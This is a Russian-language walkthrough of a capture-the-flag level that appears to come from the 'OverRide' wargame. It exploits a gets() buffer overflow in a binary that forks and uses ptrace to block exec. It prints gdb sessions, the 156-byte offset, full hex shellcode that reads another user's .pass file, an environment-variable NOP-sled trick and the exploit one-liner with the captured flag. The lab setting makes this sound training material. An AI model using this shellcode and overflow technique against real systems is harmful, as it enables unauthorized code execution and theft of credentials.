Проанализировав код бинарника становится понятно, что программа объявляет буфер размером 32 байта, а затем вызывает fork для создания дочернего процесса.  

В дочернем процессе используется функция ptrace, чтобы отслеживать родительский процесс. Сначала отображается сообщение ```"Give me some shellcode, k"```, затем вызывается gets для заполнения буфера.  

В то же время родительский процесс ожидает обновления статуса от дочернего процесса. Если родительский процесс получает сигнал SIGCHLD, означающий, что дочерний процесс завершился, он также возвращается. В противном случае он использует ptrace для мониторинга системных вызовов, выполняемых дочерним процессом. Если он найдет exec, то убивает процесс и возвращается.

Отсюда мы понимаем, что необходимо использовать шелл-код, не использующий вызов функции exec.

Для начала необходимо найти правильное смещение, чтобы перезаписать адрес возврата.

```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 2432]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2432]
0x41326641 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0xf7fd08c4       -134412092
edx            0xffffd670       -10640
ebx            0x41386541       1094214977
esp            0xffffd710       0xffffd710
ebp            0x31664130       0x31664130
esi            0x0      0
edi            0x66413965       1715550565
eip            0x41326641       0x41326641
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

Offset - 156 (https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)

Как выяснилось раньше мы не можем использовать системный вызов exec, поэтому мы будем использовать шелл-код, который вызывает open/read/write, чтобы распечатать содержимое файла .pass. Добавим перед ним nop символы и экспортируем в переменные окружения:

```
export SHELLCODE=`python -c 'print "\x90"*10 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
```
Наконец, мы находим адрес нашей переменной SHELLCODE в стеке, запуская исполняемый файл в дебаггере. Затем запускаем его снова, отправляя строку из 156 символов, за которой следует этот адрес (плюс 16-байтовое смещение), чтобы попасть в наш nop след.

```
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) x/10s *((char**)environ)
0xffffd879:      "SHELLCODE=[...]"

level04@OverRide:~$ python -c 'print "A" * 156 + "\x8c\xd8\xff\xff"' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```